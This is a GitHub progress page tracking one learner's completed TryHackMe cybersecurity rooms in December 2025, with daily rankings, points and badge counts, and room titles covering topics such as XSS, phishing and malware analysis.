<img width="1894" height="889" alt="image" src="https://github.com/user-attachments/assets/ea28a534-a36e-4de6-ad52-e5dea67833b5" />

<img width="1894" height="880" alt="image" src="https://github.com/user-attachments/assets/fe237b3b-e67a-4b8c-b3a6-d01a0196e75b" />


<img width="1894" height="901" alt="image" src="https://github.com/user-attachments/assets/b9bc20ec-dccc-4b7d-a904-4dd481b61013" />




<br>
<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d970ea98-e261-437b-b4fa-60bf8d3d4247"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|27      |Medium 🚩 - Metamorphosis                       |11 |     101ˢᵗ  |     3ʳᵈ    |    4,966ᵗʰ   |       58ᵗʰ     |    135,348  |    1,053    |    84     |
|26      |Hard 🚩 - The Great Disappearing Act            |10 |     101ˢᵗ  |     3ʳᵈ    |    5,091ˢᵗ   |       62ⁿᵈ     |    135,288  |    1,052    |    84     |
|25      |Medium 🚩 - Profiles                             |9 |     100ᵗʰ  |     3ʳᵈ    |   13,969ᵗʰ   |      156ᵗʰ     |    135,198  |    1,051    |    84     |
|24      |Medium 🔗 - YARA Rules - YARA mean one!          |8 |     100ᵗʰ  |     3ʳᵈ    |   10,263ʳᵈ   |      127ᵗʰ     |    135,168  |    1,050    |    84     |
|24      |Easy 🔗 - Exploitation with cURL - Hoperation Eggsploit|8 |100ᵗʰ |     3ʳᵈ    |   12,804ᵗʰ   |      154ᵗʰ     |    135,144  |    1,049    |    84     |
|24      |Medium 🔗 - Phishing - Phismas Greetings         |8 |     100ᵗʰ  |     3ʳᵈ    |   14,507ᵗʰ   |      174ᵗʰ     |    135,112  |    1,048    |    84     |
|24      |Easy 🔗 - n8n: CVE-2025-68613                    |8 |     102ⁿᵈ  |     3ʳᵈ    |   18,279ᵗʰ   |      205ᵗʰ     |    135,064  |    1,047    |    84     |
|24      |Medium 🔗 - C2 Detection - Command & Carol       |8 |     101ˢᵗ  |     3ʳᵈ    |   17,260ᵗʰ   |      193ʳᵈ     |    135,048  |    1,046    |    84     |
|23      |Easy 🔗 - AWS Security - S3cret Santa            |7 |      99ᵗʰ  |     3ʳᵈ    |   16,068ᵗʰ   |      182ⁿᵈ     |    135,008  |    1,045    |    84     |
|23      |Easy 🔗 - Malware Analysis - Malhare.exe         |7 |      99ᵗʰ  |     3ʳᵈ    |   17,332ⁿᵈ   |      191ˢᵗ     |    134,968  |    1,044    |    84     |
|20      |Medium 🔗 - Containers - DoorDasher's Demise     |4 |     100ᵗʰ  |     3ʳᵈ    |   18,059ᵗʰ   |      206ᵗʰ     |    134,864  |    1,043    |    84     |
|20      |Medium 🔗 - Forensics - Registry Furensics       |4 |     100ᵗʰ  |     3ʳᵈ    |   20,497ᵗʰ   |      239ᵗʰ     |    134,832  |    1,042    |    84     |
|20      |Medium 🔗 - Web Attack Forensics - Drone Alone   |4 |     100ᵗʰ  |     3ʳᵈ    |   21,935ᵗʰ   |      243ʳᵈ     |    134,808  |    1,041    |    84     |
|20      |Easy 🔗 - XSS - Merry XSSMas                     |4 |     100ᵗʰ  |     3ʳᵈ    |   23,069ᵗʰ   |      256ᵗʰ     |    134,792  |    1,040    |    84     |
|20      |Easy 🔗 -  Race Conditions - Toy to The World    |4 |     100ᵗʰ  |     3ʳᵈ    |   24,717ᵗʰ   |      275ᵗʰ     |    134,768  |    1,039    |    84     |
|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |4 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:    101ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/062327ee-a313-47f1-9852-f1608f3d3858"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/fd6d6295-0ce6-4f9c-9be6-f22a1da92af0"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/895c6d16-b76a-480c-bdeb-d261c79c134e"><br><br>
                  Global monthly:   4,966ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c17b8c52-1ef4-460d-ad4c-3a7b0da8f95e"><br><br>
                  Brazil monthly:      58ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b52a3337-bd67-43a7-8654-000b1fda3945"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

